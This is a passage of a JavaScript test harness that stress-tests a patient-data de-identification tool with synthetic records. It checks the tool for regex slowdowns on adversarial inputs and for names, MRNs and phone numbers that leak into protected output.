    ['Ho, Minh', 'Ho RN called'], ['Vo, Anh', 'VO per Dr. Smith (verbal order)'], ['Ng, Kevin', 'NG tube placed'], ['An, Ji', 'an IV was started'], ['Wu, Lin', 'Wu called back'], ['Md, Ali', 'Smith MD ok to proceed'], ['Rn, Sam', 'Lee RN at bedside'], ['Np, Jo', 'Jones NP signed']];
  const p18 = [];
  shortNames.forEach(([name, note], k) => {
    const table = { headers: ['Patient Name', 'MRN', 'Comments'], rows: [[name, String(30400100 + k), note], ['Gatsby, Jay', '41832795', note]] };
    const o = runPipeline(D, table, { seed: 1 }, 'table');
    p18.push(...pipelineProblems(o, `patient "${name}" + note ${JSON.stringify(note)}`, `D.processTable({headers:['Patient Name','MRN','Comments'], rows:[[${JSON.stringify(name)},'${30400100 + k}',${JSON.stringify(note)}]]}, {})`));
  });
  emitCheck(1, '1.8', 'patients with short surnames that are also credentials/abbreviations (Do/DO, Ma/MA, Pa/PA, Le, Ho, Vo, Ng, An, Wu, Md, Rn, Np)', p18);
}

// =================================================================== section 2: ReDoS / time bounds
const FAMILIES = {
  'digits spaced': (n) => rep('1 2 3 4 5 6 7 8 9 0 ', n),
  'digits hyphen 5-5-5': (n) => rep('5-', n),
  'digits slash': (n) => rep('1/', n),
  'digits dot': (n) => rep('4.', n),
  'digits paren': (n) => rep('(7) ', n),
  'digit run': (n) => rep('7165550123', n),
  'digits mixed seps': (n) => rep('1-2/3.4 (5) ', n),
  'digits 3-2-4': (n) => rep('123-45-', n),
  'number words': (n) => rep('five ', n),
  'number words mixed': (n) => rep('ninety-two five oh one seven ', n),
  'number words hyphen': (n) => rep('five-', n),
  'cap words': (n) => rep('Smith Jones Brown Miller ', n),
  'cap words random': (n) => { let s = '', x = 7; while (s.length < n) { x = (x * 1103515245 + 12345) & 0x7fffffff; s += String.fromCharCode(65 + (x % 26)) + 'abcdefghij'.slice(0, 2 + (x % 7)) + ' '; } return s.slice(0, n); },
  'cap Last, First chain': (n) => rep('Smith, John, ', n),
  'ALL CAPS words': (n) => rep('SMITH JOHN ', n),
  'hyphenated name chain': (n) => rep('Smith-Jones-', n),
  'apostrophes': (n) => rep("O'", n),
  'initials dotted': (n) => rep('A. ', n),
  'initials run': (n) => rep('A.B.', n),
  'commas': (n) => rep(',', n),
  'slashes': (n) => rep('/', n),
  'hyphens': (n) => rep('-', n),
  'periods': (n) => rep('.', n),
  'spaces': (n) => 'x' + rep(' ', n - 2) + 'x',
  'tabs': (n) => 'x' + rep('\t', n - 2) + 'x',
  'newlines': (n) => 'x' + rep('\n', n - 2) + 'x',
  'comma space': (n) => rep(', ', n),
  'mixed punctuation': (n) => rep(', / - ', n),
  'open parens': (n) => rep('(', n),
  'brackets': (n) => rep('[', n),
  'Mr. Mr. Mr.': (n) => rep('Mr. ', n),
  'Dr. Dr.': (n) => rep('Dr. ', n),
  'MRN: labels': (n) => rep('MRN: ', n),
  'MRN# glued': (n) => rep('MRN#', n),
  'DOB labels': (n) => rep('DOB ', n),
  'dates m/d/yy': (n) => rep('11/7/26 ', n),
  'dates glued': (n) => rep('11/7/26', n),
  'dates words': (n) => rep('Nov 7th, ', n),
  'dates iso': (n) => rep('2026-11-07 ', n),
  'times': (n) => rep('10:30 ', n),
  'email dots no tld': (n) => rep('a.', n - 1) + '@',
  'email at chain': (n) => rep('a@', n),
  'email long local': (n) => rep('a', n - 12) + '@example.com',
  'email long domain': (n) => 'a@' + rep('b.', n - 2),
  'email hyphen domain': (n) => 'a@' + rep('b-', n - 2),
  'url dots': (n) => 'http://' + rep('a.', n - 7),
  'url slashes': (n) => 'http://a' + rep('/a', n - 8),
  'url www hyphens': (n) => 'www.' + rep('a-', n - 4),
  'url query': (n) => 'https://x.org/?' + rep('a=1&', n - 15),
  'address': (n) => rep('123 Main ', n),
  'street suffix': (n) => rep('St ', n),
  'PO Box': (n) => rep('PO Box ', n),
  'ages': (n) => rep('90 ', n),
  'ages yo': (n) => rep('91yo ', n),
  'relations': (n) => rep("pt's son ", n),
  'contact verbs': (n) => rep('Called ', n),
  'OCR confusables': (n) => rep('O0Ol1lI', n),
  'single token': (n) => rep('x', n),
  'C1D1': (n) => rep('C1D1 ', n),
  'zip': (n) => rep('14217 ', n),
  'City, ST': (n) => rep('Buffalo, NY ', n),
  'unicode caps': (n) => rep('\u0141ukasz \u017B\u00F3\u0142\u0107 ', n),
  'emoji': (n) => rep('\uD83D\uDE00 ', n),
  'trailing spaces': (n) => 'Gatsby called re labs' + rep(' ', n - 21),
  'trailing newlines': (n) => 'Gatsby called re labs' + rep('\n', n - 21),
  'name then blank lines': (n) => 'Gatsby, Jay' + rep('\n', n - 12) + 'x',
  'blank lines between words': (n) => rep('called\n\n\n\n\n\n\n\n', n),
  'space-padded columns': (n) => rep('Gatsby, Jay' + ' '.repeat(60), n),
  'realistic note': (n) => rep("Pt Gatsby, Jay (MRN 00418327) seen 11/7/26 by Dr. Wolfsheim; son Nick 716-555-0123 will drive. Keytruda 200 mg, ANC 1.2. ", n),
};
function adversarialCensus(D) {
  const S = require(SRC('synth.js'));
  const reg = D.createRegistry();
  const s = S.make({ n: 40, seed: 202 });
  const cols = D.classifyColumns(s.headers, s.rows);
  const census = D.buildCensus(s.headers, s.rows, cols, { registry: reg });
  return { reg, census };
}
function chunksLikeDetectText(text, CH) {
  // mirrors detectText's split (6000 chars, cut at a newline / ". " / space in the second half of the window)
  const out = []; let pos = 0;
  if (text.length <= CH) return [text];
  while (pos < text.length) {
    let end = Math.min(text.length, pos + CH);
    if (end < text.length) {
      const cut = Math.max(text.lastIndexOf('\n', end - 1), text.lastIndexOf('. ', end - 2) + 1);
      if (cut > pos + CH / 2) end = cut + 1;
      else { const sp = text.lastIndexOf(' ', end - 1); if (sp > pos + CH / 2) end = sp + 1; }
    }
    out.push(text.slice(pos, end)); pos = end;
  }
  return out;
}
const STEPS = ['classifyColumns', 'buildCensus', 'ruleSpans', 'lexiconSpans', 'censusSpans', 'detectText', 'parseTextDocument', 'processTable', 'selfCheck', 'text path processTable'];
// a step that hangs makes every step that runs it hang too: skip those on the re-run
const CONTAINS = {
  classifyColumns: ['processTable', 'selfCheck', 'text path processTable'], buildCensus: ['processTable', 'selfCheck', 'text path processTable'],
  ruleSpans: ['detectText', 'processTable', 'selfCheck', 'text path processTable'], lexiconSpans: ['detectText', 'processTable', 'selfCheck', 'text path processTable'],
  censusSpans: ['detectText', 'processTable', 'selfCheck', 'text path processTable'], detectText: ['processTable', 'selfCheck', 'text path processTable'],
  parseTextDocument: ['text path processTable'], processTable: ['selfCheck'], selfCheck: [], 'text path processTable': [],
};
function familyChild(name, size, skipList) {
  const D = loadCore();
  const s = FAMILIES[name](size);
  const skip = new Set(String(skipList || '').split(',').filter(Boolean));
  const ms = {};
  const T = (step, fn) => { if (skip.has(step)) return null; emitLine('@@S', { step }); const t0 = now(); fn(); const t = now() - t0; emitLine('@@E', { step, ms: t }); ms[step] = t; return t; };
  const { reg, census } = adversarialCensus(D);
  const cfg = D.compileConfig(D.defaultConfig({}));
  const ctx = { cfg, census, propagateRegex: null, rowPatientKey: null, manual: null, cellKey: null, fragments: null };
  // warm every lazily-compiled regex
  D.processTable({ headers: ['Patient Name', 'MRN', 'Comments'], rows: [['Gatsby, Jay', '00418327', 'warm 11/7/26 Smith, John 716-555-0123 a@b.com http://x.org 123 Main St']] }, { registry: D.createRegistry() });
  D.parseTextDocument('Gatsby, Jay  MRN 00418327  DOB 1/2/1950\nwarm up');
  D.selfCheck(D.processTable({ headers: ['Comments'], rows: [['warm']] }, {}), { kind: 'table' });
  const bound = size >= 50000 ? 2000 : 250;
  const table = { headers: ['Patient Name', 'MRN', 'Comments'], rows: [['Gatsby, Jay', '00418327', s]] };
  const retry = (step, fn) => { let t = T(step, fn); if (t != null && t > bound && t < bound * 6) { const t2 = T(step, fn); t = Math.min(t, t2); ms[step] = t; } return t; };
  let cols = null;
  retry('classifyColumns', () => { cols = D.classifyColumns(table.headers, table.rows); });
  // the census reads identifier columns: put the string in the patient-name and MRN columns
  const roles3 = ['patient_name', 'mrn', 'text'].map((role, i) => ({ header: table.headers[i], index: i, role }));
  retry('buildCensus', () => { D.buildCensus(table.headers, [[s, '00418327', 'x'], ['Gatsby, Jay', s, 'x']], roles3, { registry: D.createRegistry() }); });
  const chunks = chunksLikeDetectText(s, 6000);
  T('ruleSpans', () => chunks.forEach((c) => D.ruleSpans(c, cfg)));
  T('lexiconSpans', () => chunks.forEach((c) => D.lexiconSpans(c, cfg)));
  T('censusSpans', () => chunks.forEach((c) => D.censusSpans(c, census, null, null)));
  T('detectText', () => D.detectText(s, ctx));
  let doc = null;
  retry('parseTextDocument', () => { doc = D.parseTextDocument(s); });
  let res = null;
  retry('processTable', () => { res = D.processTable(table, { registry: reg, seed: 3 }); });
  if (res) retry('selfCheck', () => D.selfCheck(res, { kind: 'table' })); else skip.add('selfCheck');
  if (doc) T('text path processTable', () => D.processTable({ headers: doc.headers, rows: doc.rows }, { columns: doc.columns, registry: D.createRegistry(), seed: 3 }));
  const det = ms.detectText, sum = (ms.ruleSpans || 0) + (ms.lexiconSpans || 0) + (ms.censusSpans || 0);
  emitLine('@@F', { name, size: s.length, bound, ms, post: det != null ? Math.max(0, det - sum) : null, errs: res && res.errors ? res.errors.length : -1, docRows: doc ? doc.rows.length : 0, skipped: [...skip] });
}
function runChild(args, timeout) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [__filename, ...args], { stdio: ['ignore', 'pipe', 'pipe'] });
    let out = '', err = '', killed = false;
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { err += d; if (err.length > 20000) err = err.slice(-20000); });
    const timer = setTimeout(() => { killed = true; child.kill('SIGKILL'); }, timeout);
    child.on('close', (code, signal) => { clearTimeout(timer); resolve({ out, err, code, signal, killed }); });
  });
}
// Every regex literal in src/core.js (named constants, RULES entries and inline literals such as .replace(/\s+$/, '')), found
// with a small lexer that skips strings, template literals and comments, so a slow pass can be narrowed to the regex that
// backtracks. Regexes built at run time with new RegExp(...) are not covered.
function coreRegexes() {
  const src = fs.readFileSync(SRC('core.js'), 'utf8');
  const out = [], seen = new Set();
  let i = 0, line = 1, prev = '', prevWord = '';
  const lineAt = () => line;
  const ctxOk = () => (prev === '' || '(,=:[!&|?{};+-*%<>~^'.includes(prev) || /^(?:return|typeof|case|in|of|void|delete|throw|else)$/.test(prevWord));
  while (i < src.length) {
    const c = src[i];
    if (c === '\n') { line++; i++; continue; }
    if (c === ' ' || c === '\t' || c === '\r') { i++; continue; }
    if (c === '/' && src[i + 1] === '/') { while (i < src.length && src[i] !== '\n') i++; continue; }
    if (c === '/' && src[i + 1] === '*') { i += 2; while (i < src.length && !(src[i] === '*' && src[i + 1] === '/')) { if (src[i] === '\n') line++; i++; } i += 2; continue; }
    if (c === '\'' || c === '"') { i++; while (i < src.length && src[i] !== c) { if (src[i] === '\\') i++; i++; } i++; prev = 'x'; prevWord = ''; continue; }
    if (c === '`') { i++; let depth = 0; while (i < src.length && !(src[i] === '`' && depth === 0)) { if (src[i] === '\\') i++; else if (src[i] === '$' && src[i + 1] === '{') { depth++; i++; } else if (src[i] === '}' && depth > 0) depth--; else if (src[i] === '\n') line++; i++; } i++; prev = 'x'; prevWord = ''; continue; }
    if (c === '/' && ctxOk()) {
      const start = i, ln = lineAt(); let j = i + 1, inClass = false;
      while (j < src.length && src[j] !== '\n') { const d = src[j]; if (d === '\\') { j += 2; continue; } if (d === '[') inClass = true; else if (d === ']') inClass = false; else if (d === '/' && !inClass) break; j++; }
      if (src[j] === '/') {
        let k = j + 1; while (/[a-z]/.test(src[k] || '')) k++;
        const lit = src.slice(start, k);
        try { const re = new Function(`return ${lit};`)(); if (re instanceof RegExp && !seen.has(re.source + '/' + re.flags)) { seen.add(re.source + '/' + re.flags); const nm = (src.slice(src.lastIndexOf('\n', start) + 1, start).match(/(?:const|let|var)\s+([A-Za-z_]\w*)\s*=\s*$|([A-Za-z_]\w*)\s*:\s*$/) || []); out.push({ name: nm[1] || nm[2] || 'inline', line: ln, re }); } } catch (e) { /* not a regex */ }
        i = k; prev = 'x'; prevWord = ''; continue;
      }
    }
    if (/[A-Za-z_$]/.test(c)) { let k = i; while (/[\w$]/.test(src[k] || '')) k++; prevWord = src.slice(i, k); prev = 'x'; i = k; continue; }
    prev = c; prevWord = ''; i++;
  }
  return out;
}
function sweepChild(name, len, skipList) {
  // two sample sizes: an absolute cost at 2,000 chars, and the growth to 8,000 chars (quadratic or worse shows as x16+)
  const skip = new Set(String(skipList || '').split(',').filter(Boolean).map(Number));
  const s1 = FAMILIES[name](len), s2 = FAMILIES[name](len * 4);
  const time = (re, s) => { const r = new RegExp(re.source, re.flags.includes('g') ? re.flags : re.flags + 'g'); const t0 = now(); let m, c = 0; r.lastIndex = 0; while ((m = r.exec(s)) && c++ < 50000) { if (m[0].length === 0) r.lastIndex++; } return now() - t0; };
  coreRegexes().forEach((r, i) => {
    if (skip.has(i)) return;
    emitLine('@@S', { i, name: r.name, line: r.line });
    const a = time(r.re, s1);
    const b = a < 1000 ? time(r.re, s2) : null;
    emitLine('@@E', { i, name: r.name, line: r.line, ms: a, ms4: b });
  });
  emitLine('@@F', {});
}
async function regexSweep(name, len) {
  const slow = []; const skip = [];
  for (let attempt = 0; attempt < 6; attempt++) {
    const r = await runChild(['--sweep', name, String(len), skip.join(',')], 30000);
    const lines = r.out.split('\n');
    lines.filter((l) => l.startsWith('@@E ')).map((l) => JSON.parse(l.slice(4))).forEach((e) => {
      const grow = e.ms4 != null && e.ms > 0.5 ? e.ms4 / e.ms : null;
      if (e.ms > 40 || (e.ms4 != null && e.ms4 > 40 && grow > 8)) slow.push({ key: e.ms4 != null ? e.ms4 : e.ms * 16, text: `${e.name === 'inline' ? 'inline regex' : e.name} (src/core.js:${e.line}) ${e.ms.toFixed(0)} ms @${len}${e.ms4 != null ? `, ${e.ms4.toFixed(0)} ms @${len * 4}` : ''}` });
    });
    if (lines.some((l) => l.startsWith('@@F '))) break;
    const st = lines.filter((l) => l.startsWith('@@S ')).map((l) => JSON.parse(l.slice(4))).pop();
    if (!st) break;
    slow.push({ key: Infinity, text: `${st.name} (src/core.js:${st.line}) did not finish` }); skip.push(st.i);
  }
  const top = slow.sort((a, b) => b.key - a.key);
  return top.slice(0, 4).map((x) => x.text).concat(top.length > 4 ? [`+${top.length - 4} more with superlinear growth`] : []);
}
async function runFamily(name, size) {
  // runs the family; when a step hangs, re-runs without it (and without the steps that contain it) to time the rest
  const timeout = size >= 50000 ? 30000 : 15000;
  const hung = [], ms = {}; let fin = null, crash = null; const skip = new Set();
  for (let attempt = 0; attempt < 4; attempt++) {
    const r = await runChild(['--family', name, String(size), [...skip].join(',')], timeout);
    const lines = r.out.split('\n');
    lines.filter((l) => l.startsWith('@@E ')).forEach((l) => { const e = JSON.parse(l.slice(4)); ms[e.step] = ms[e.step] == null ? e.ms : Math.min(ms[e.step], e.ms); });
    const f = lines.find((l) => l.startsWith('@@F '));
    if (f) { fin = JSON.parse(f.slice(4)); break; }
    const starts = lines.filter((l) => l.startsWith('@@S ')).map((l) => JSON.parse(l.slice(4)).step);
    const last = starts[starts.length - 1];
    if (!r.killed) { crash = `child exited ${r.code} in ${last || 'setup'}: ${r.err.replace(/\s+/g, ' ').slice(-300)}`; break; }
    if (!last || skip.has(last)) break;
    hung.push(last); skip.add(last); (CONTAINS[last] || []).forEach((x) => skip.add(x));
  }
  return { name, size, timeout, hung, ms, fin, crash, skipped: [...skip] };
}
async function section2() {
  const sizes = QUICK ? [5000] : [5000, 100000];
  const jobs = [];
  for (const size of sizes) for (const name of Object.keys(FAMILIES)) jobs.push({ name, size });
  const conc = Math.max(1, Math.min(2, Math.floor(os.cpus().length / 2)));
  const results = [];
  let next = 0;
  async function worker() { while (next < jobs.length) { const j = jobs[next++]; progress(`2 family ${j.name} ${j.size}`); results.push(await runFamily(j.name, j.size)); } }
  await Promise.all(Array.from({ length: conc }, worker));
  results.sort((a, b) => a.size - b.size || Object.keys(FAMILIES).indexOf(a.name) - Object.keys(FAMILIES).indexOf(b.name));
  // narrow each slow family to the named core.js regexes that backtrack on it (2,000-char sample)
  const sweeps = new Map();
  for (const r of results) {
    const bound = r.size >= 50000 ? 2000 : 250;
    const bad = r.hung.length || ['processTable', 'classifyColumns', 'buildCensus', 'parseTextDocument', 'selfCheck'].some((k) => r.ms[k] != null && r.ms[k] > bound);
    if (!bad || sweeps.has(r.name)) continue;
    progress(`2 regex sweep ${r.name}`);
    sweeps.set(r.name, await regexSweep(r.name, 2000));
  }
  const sweepNote = (name) => { const sw = sweeps.get(name); return sw ? (sw.length ? `; regex literals in core.js that are slow or grow superlinearly on this input: ${sw.join(', ')}` : '; no regex literal in core.js is slow on 2,000/8,000-char samples (look at regexes built with new RegExp, or at loops)') : ''; };
  const hangs = [], slow = [], crashes = [], slowAux = [];
  const fmt = (x) => (x == null ? '-' : x.toFixed(0));
  for (const r of results) {
    const { name, size } = r;
    const bound = size >= 50000 ? 2000 : 250;
    const gen = FAMILIES[name].toString().replace(/^\(n\) => /, '').replace(/\brep\(/g, 'rep(');
    const repro = (call) => `node -e "const D=require('./src/core.js'); const rep=(u,n)=>u.repeat(Math.ceil(n/u.length)).slice(0,n); const n=${size}; const s=${short(gen, 140).replace(/"/g, '\\"')}; console.time('t'); ${call}; console.timeEnd('t')"`;
    const ptCall = "D.processTable({headers:['Patient Name','MRN','Comments'],rows:[['Gatsby, Jay','00418327',s]]},{})";
    const stepCall = { buildCensus: "D.buildCensus(['Patient Name','MRN','Comments'],[[s,'00418327','x']],[{header:'Patient Name',index:0,role:'patient_name'},{header:'MRN',index:1,role:'mrn'},{header:'Comments',index:2,role:'text'}],{registry:D.createRegistry()})", classifyColumns: "D.classifyColumns(['Patient Name','MRN','Comments'],[['Gatsby, Jay','00418327',s]])", parseTextDocument: 'D.parseTextDocument(s)', ruleSpans: 'D.ruleSpans(s, D.compileConfig(D.defaultConfig({})))', lexiconSpans: 'D.lexiconSpans(s, D.compileConfig(D.defaultConfig({})))', detectText: 'D.detectText(s, {})' };
    r.hung.forEach((step) => hangs.push({ sev: 'blocker', label: `${name} @${size}`, msg: `${step} did not finish in ${r.timeout / 1000} s (process killed); other steps: ${Object.entries(r.ms).map(([k, v]) => `${k} ${fmt(v)}ms`).join(', ') || 'none'}${sweepNote(name)}`, repro: `${repro(stepCall[step] || ptCall)}   (harness: node test/robust.js --family ${JSON.stringify(name)} ${size})`, observed: `${step} still running after ${r.timeout / 1000} s on a ${size}-char cell (${name}); finished steps: ${Object.entries(r.ms).map(([k, v]) => `${k} ${fmt(v)} ms`).join(', ')}${sweepNote(name)}`, expected: `${step} finishes in < ${bound} ms` }));
    if (r.crash) crashes.push({ sev: 'blocker', label: `${name} @${size}`, msg: r.crash, repro: `node test/robust.js --family ${JSON.stringify(name)} ${size}` });
    const m = r.ms;
    const det = [['ruleSpans', m.ruleSpans], ['lexiconSpans', m.lexiconSpans], ['censusSpans', m.censusSpans], ['classifyColumns', m.classifyColumns], ['buildCensus', m.buildCensus], ['post-processing (resolve/merge/finishNames)', r.fin ? r.fin.post : null]].filter((x) => x[1] != null).sort((a, b) => b[1] - a[1]);
    const culprit = det.length ? `${det[0][0]} ${fmt(det[0][1])} ms (classify ${fmt(m.classifyColumns)}, census build ${fmt(m.buildCensus)}, rule ${fmt(m.ruleSpans)}, lexicon ${fmt(m.lexiconSpans)}, census ${fmt(m.censusSpans)}, post ${fmt(r.fin && r.fin.post)}; detectText ${fmt(m.detectText)}, run twice by processTable)` : 'n/a';
    if (m.processTable != null && m.processTable > bound) slow.push({ sev: 'major', label: `${name} @${size}`, msg: `processTable one cell ${fmt(m.processTable)} ms > ${bound} ms; slowest: ${culprit}${sweepNote(name)}`, repro: repro(ptCall), observed: `${fmt(m.processTable)} ms (slowest part: ${culprit})`, expected: `< ${bound} ms per cell` });
    [['classifyColumns', bound], ['buildCensus', bound], ['parseTextDocument', bound], ['selfCheck', bound], ['text path processTable', bound * 2]].forEach(([step, b]) => {
      if (m[step] != null && m[step] > b && !r.hung.includes(step)) slowAux.push({ sev: 'major', label: `${name} @${size}`, msg: `${step} ${fmt(m[step])} ms > ${b} ms${sweepNote(name)}`, repro: repro(stepCall[step] || ptCall), observed: `${fmt(m[step])} ms`, expected: `< ${b} ms` });
    });
    if (r.fin && r.fin.errs > 0) crashes.push({ sev: 'major', label: `${name} @${size}`, msg: `processTable reported ${r.fin.errs} internal error(s) on this cell`, repro: repro(ptCall) });
  }
  if (VERBOSE || !QUICK) {
    const top = results.filter((r) => r.ms.processTable != null || r.hung.length).sort((a, b) => (b.hung.length - a.hung.length) || ((b.ms.processTable || 0) - (a.ms.processTable || 0))).slice(0, VERBOSE ? results.length : 10);
    emit({ sec: 2, id: '2.t', name: `slowest (ms: processTable / classifyColumns / buildCensus / rule / lexicon / census / detectText / selfCheck / parseTextDocument / text path): ${top.map((r) => `${r.name}@${r.size}${r.hung.length ? ' HUNG in ' + r.hung.join('+') : ''}: ${['processTable', 'classifyColumns', 'buildCensus', 'ruleSpans', 'lexiconSpans', 'censusSpans', 'detectText', 'selfCheck', 'parseTextDocument', 'text path processTable'].map((k) => fmt(r.ms[k])).join('/')}`).join('; ')}`, status: 'INFO' });
  }
  emitCheck(2, '2.1', `no hang: ${results.length} adversarial strings (${Object.keys(FAMILIES).length} families x ${sizes.join(' and ')} chars), each in a child process killed after 15/30 s; a hung step is named and the rest re-timed without it`, hangs.concat(crashes));
  emitCheck(2, '2.2', 'per-cell processTable time: < 250 ms for a 5k-char cell, < 2 s for a 100k-char cell (slowest part named)', slow);
  emitCheck(2, '2.3', 'classifyColumns, buildCensus, parseTextDocument, selfCheck (< bound) and the text-path processTable (< 2x bound) on the same strings', slowAux);
}

// =================================================================== section 3: census guarantee
const VARIANTS = {
  asis: (s) => s,
  lower: (s) => s.toLowerCase(),
  upper: (s) => s.toUpperCase(),
  nbsp: (s) => s.replace(/ /g, '\u00A0'),
  'narrow nbsp + zero-width': (s) => s.replace(/ /g, '\u202F\u200B'),
  'double space / no space after comma': (s) => s.replace(/, /g, ',').replace(/ /g, '  '),
  'tab between parts': (s) => s.replace(/,? /g, (m) => (m.length > 1 ? ',\t' : '\t')),
};
function normOut(s) {
  return String(s).normalize('NFKC').toLowerCase().replace(/[\u200B-\u200D\u2060\uFEFF\u00AD]/g, '').replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000\t\r\n]/g, ' ').replace(/\s*,\s*/g, ', ').replace(/\s+/g, ' ');
}
const escRe = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
function digitRuns(s) { const out = []; const re = /\d(?:[ \-.\/()\u00A0]{0,2}\d)+/g; let m; while ((m = re.exec(String(s)))) out.push(m[0].replace(/\D/g, '')); return out; }
function patientNeedles(p) {
  const strip0 = (d) => d.replace(/^0+/, '');
  const ph = String(p.phone || '').replace(/\s*(?:x|ext\.?)\s*\d+$/i, '').replace(/\D/g, '').replace(/^1(?=\d{10}$)/, '');
  const digits = [];
  if (p.mrn) digits.push(['MRN', strip0(String(p.mrn).replace(/\D/g, ''))]);
  if (p.acct) digits.push(['account', strip0(String(p.acct).replace(/\D/g, ''))]);
  if (ph.length >= 7) digits.push(['phone', ph]);
  const names = [];
  if (p.first && p.last) {
    names.push(['First Last', `${p.first} ${p.last}`.toLowerCase()]);
    names.push(['Last, First', `${p.last}, ${p.first}`.toLowerCase()]);
  }
  return { digits: digits.filter((d) => d[1].length >= 7), names };
}
function findLeaks(result, patients) {
  // per cell, rows and headers; returns [{ri, ci, what, needle, cell, p}]. One alternation for every name, a substring
  // lookup for every identifier, so a 2,000-row table with 800 patients is checked in about a second.
  const leaks = [];
  const nameMap = new Map(), digitMap = new Map(), lens = new Set();
  patients.forEach((p) => {
    const nd = patientNeedles(p);
    nd.names.forEach(([what, n]) => { if (!nameMap.has(n)) nameMap.set(n, []); nameMap.get(n).push([what, p]); });
    nd.digits.forEach(([what, d]) => { if (!digitMap.has(d)) digitMap.set(d, []); digitMap.get(d).push([what, p]); lens.add(d.length); });
  });
  const nameRe = nameMap.size ? new RegExp(`(?<![\\p{L}])(?:${[...nameMap.keys()].sort((a, b) => b.length - a.length).map(escRe).join('|')})(?![\\p{L}])`, 'gu') : null;
  const scan = (v, ri, ci) => {
    const s = v instanceof Date ? '' : (v == null ? '' : String(v));
    if (!s) return;
    if (nameRe) { const ns = normOut(s); nameRe.lastIndex = 0; let m; while ((m = nameRe.exec(ns))) (nameMap.get(m[0]) || []).forEach(([what, p]) => leaks.push({ ri, ci, what, needle: m[0], cell: s, p })); }
    if (digitMap.size) digitRuns(s).forEach((run) => [run, run.replace(/^0+/, '')].forEach((r) => lens.forEach((L) => { for (let k = 0; k + L <= r.length; k++) { const hit = digitMap.get(r.substr(k, L)); if (hit) hit.forEach(([what, p]) => leaks.push({ ri, ci, what, needle: r.substr(k, L), cell: s, p })); } })));
  };
  (result.headers || []).forEach((h, ci) => scan(h, -1, ci));
  (result.rows || []).forEach((row, ri) => row.forEach((v, ci) => { if (result.headers[ci] !== 'DeID Audit') scan(v, ri, ci); }));
  return leaks;
}
function classifyLeaks(leaks, chk, label, reproFn) {
  const out = [];
  const hits = chk ? chk.hits : [];
  const seen = new Set();
  for (const L of leaks) {
    const key = `${L.what}|${L.needle}|${L.ri}|${L.ci}`; if (seen.has(key)) continue; seen.add(key);
    const cellFlagged = hits.some((h) => h.row === L.ri && h.col === L.ci);
    const fileBlocked = hits.length > 0 || (chk && (chk.unnamed || []).length > 0);
    const where = L.ri < 0 ? `header ${L.ci}` : `row ${L.ri} col ${L.ci}`;
    const sev = fileBlocked ? 'major' : 'blocker';
    out.push({ sev, label, msg: `${L.what} "${L.needle}" survives in ${where}: ${jstr(L.cell, 140)} \u2014 ${cellFlagged ? 'flagged by the self-check (download blocked)' : fileBlocked ? 'not flagged in this cell (file blocked by other hits)' : 'NOT flagged: the file is downloadable'}`, repro: reproFn(L), observed: `${L.what} of a census patient in output (${where}): ${jstr(L.cell, 160)}; self-check ${cellFlagged ? 'flagged it' : fileBlocked ? 'blocked the file for other reasons' : 'reported 0 hits'}`, expected: 'no MRN, account, phone, "First Last" or "Last, First" of any census patient in the protected output' });
  }
  return out;
}
function section3() {
  const D = loadCore();
  const S = require(SRC('synth.js'));
  const LEX = require(SRC('lexicon.js'));
  const probs31 = [], probs32 = [], probs33 = [], probs34 = [];
  const seeds = QUICK ? 4 : 12;
  let runs = 0;
  // every self-check hit not explained by a leak the harness found: either text the tool wrote itself (a false alarm caused
  // by a surrogate or code colliding with a census token) or a census token that survived and was caught (download blocked)
  const selfIntroduced = new Map(), caught = new Map();
  const classifyHits = (res, chk, leaks, inRows, label) => {
    chk.hits.forEach((h) => {
      if (h.kind === 'error' || h.row < 0 || h.col < 0) return;
      if (leaks.some((L) => L.ri === h.row && L.ci === h.col)) return;
      const inp = D.cellToString(inRows[h.row] ? inRows[h.row][h.col] : ''); const t = String(h.text);
      const present = /\d/.test(t) && !/[A-Za-z]{2}/.test(t) ? inp.replace(/\D/g, '').includes(t.replace(/\D/g, '')) : normOut(inp).includes(normOut(t));
      const m = present ? caught : selfIntroduced; const k = `${h.type} "${t}"`;
      if (!m.has(k)) m.set(k, { n: 0, ex: `${label} row ${h.row}: output ${jstr(res.rows[h.row][h.col], 110)}` }); m.get(k).n++;
    });
  };
  const ambiguous = (w) => LEX.isAmbiguous(w) || LEX.isEnglishWord(w) || LEX.isClinical(w);
  for (let seed = 1; seed <= seeds; seed++) {
    for (const [vname, V] of Object.entries(VARIANTS)) {
      progress(`3 table seed ${seed} ${vname}`);
      const s = S.make({ n: 60, seed: 300 + seed });
      const byMrn = new Map(s.patients.map((p) => [String(p.mrn).replace(/^0+/, ''), p]));
      const rng = makeRng(D, 300 + seed);
      const rows = s.rows.map((r) => r.slice());
      const inTable = new Set();
      rows.forEach((row) => {
        const p = byMrn.get(String(row[3]).replace(/^0+/, '')); if (!p) return; inTable.add(p);
        row[2] = V(row[2]);
        let c = String(row[14] || '');
        if (vname === 'lower' || vname === 'upper') c = c.replace(new RegExp(`\\b(${escRe(p.first)}|${escRe(p.last)})\\b`, 'g'), (m) => V(m));
        if (vname !== 'asis' && vname !== 'lower' && vname !== 'upper') c = c.split(`${p.last}, ${p.first}`).join(V(`${p.last}, ${p.first}`));
        const mrnSp = String(p.mrn).length >= 8 ? `${String(p.mrn).slice(0, 4)} ${String(p.mrn).slice(4)}` : p.mrn;
        const inj = rng.pick([
          `; spoke with ${V(`${p.first} ${p.last}`)}, MRN ${mrnSp}, acct ${p.acct}, cb ${p.phone}`,
          `; ${V(`${p.last}, ${p.first}`)} called from ${p.phone} re MRN ${p.mrn}`,
          `; pt ${V(`${p.first} ${p.last}`)} (acct ${p.acct}) MRN# ${p.mrn}`,
        ]);
        row[14] = c + inj;
      });
      const patients = [...inTable].filter((p) => vname !== 'lower' || !(ambiguous(p.first) || ambiguous(p.last)));
      const reg = D.createRegistry();
      const res = D.processTable({ headers: s.headers, rows }, { seed: 1, registry: reg });
      runs++;
      if (res.errors && res.errors.length) probs31.push({ sev: 'major', label: `seed ${300 + seed} ${vname}`, msg: `internal errors: ${res.errors[0].message}`, repro: '' });
      const chk = D.selfCheck(res, { kind: 'table' });
      const leaks = findLeaks(res, patients);
      probs31.push(...classifyLeaks(leaks, chk, `table seed ${300 + seed} ${vname}`, (L) => `S.make({n:60,seed:${300 + seed}}), variant ${vname} on the name column + injected comment (see section3); patient ${L.p.last}, ${L.p.first} MRN ${L.p.mrn}; input cell: ${jstr(rows[L.ri] ? rows[L.ri][L.ci] : '', 200)}`));
